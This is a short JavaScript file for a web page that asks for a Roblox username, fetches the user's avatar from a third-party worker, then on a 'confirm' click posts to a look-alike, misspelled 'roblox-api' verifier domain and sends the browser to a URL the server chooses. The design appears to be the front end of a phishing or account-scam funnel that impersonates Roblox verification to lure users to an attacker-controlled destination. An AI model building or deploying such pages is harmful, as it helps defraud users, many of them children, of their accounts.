const s1 = document.getElementById("screen1");
const s2 = document.getElementById("screen2");
const s3 = document.getElementById("screen3");
const avatar = document.getElementById("avatar");
let userId = null;

function swap(from, to) {
  from.classList.add("hidden");
  setTimeout(() => to.classList.remove("hidden"), 350);
}

function next() {
  swap(s1, s2);
}

async function lookup() {
  const username = document.getElementById("username").value.trim();
  if (!username) return;

  const res = await fetch("https://rbxfinder.gwishyman.workers.dev/user", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username })
  });

  const data = await res.json();
  if (!data.userId) return;

  document.getElementById("avatar").src = data.headshot;

  swap(s2, s3);
}

function back() {
  swap(s3, s2);
}

async function confirmYes() {
  try {
    const res = await fetch("https://verifer.roblox-api-8ff.workers.dev/confirm", {
      method: "POST"
    });
    const data = await res.json();

    if (data.redirect) {
      window.location.href = data.redirect;
    }
  } catch (err) {
    alert("Failed to redirect. Try again.");
    console.error(err);
  }
}
